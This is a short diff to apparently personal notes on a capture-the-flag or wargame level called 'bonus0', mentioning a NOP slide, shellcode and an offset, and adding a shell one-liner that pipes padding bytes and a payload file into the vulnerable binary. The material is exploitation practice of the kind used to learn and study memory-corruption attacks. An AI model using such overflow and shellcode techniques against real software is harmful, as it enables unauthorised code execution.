@@ -24,3 +24,5 @@ so nop slide, shellcode 1st arg
  + for some reason offset mini is beginning of shellcode + 64
 
 this level was so boring to debug
+
+ { echo $(printf 'A%.0s' {1..20}) & sleep 0.1; cat file; } | ./bonus0
